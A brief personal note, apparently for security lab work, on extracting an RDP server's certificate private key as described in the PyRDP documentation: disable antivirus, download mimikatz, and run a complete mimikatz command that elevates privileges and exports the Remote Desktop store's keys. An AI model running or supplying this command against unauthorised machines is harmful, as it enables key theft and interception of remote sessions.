Private key extraction according to https://github.com/GoSecure/pyrdp/blob/master/docs/cert-extraction.md

1. Get certificate thumbprint from `certlm.msc`:
![[Pasted image 20221106171924.png]]
2. Disable Antivirus
3. Download mimikatz: https://github.com/gentilkiwi/mimikatz/
4. run:  `.\mimikatz.exe 'privilege::debug' 'token::elevate' 'crypto::capi' 'crypto::certificates /systemstore:LOCAL_MACHINE /store:\"Remote Desktop\" /export' 'exit'`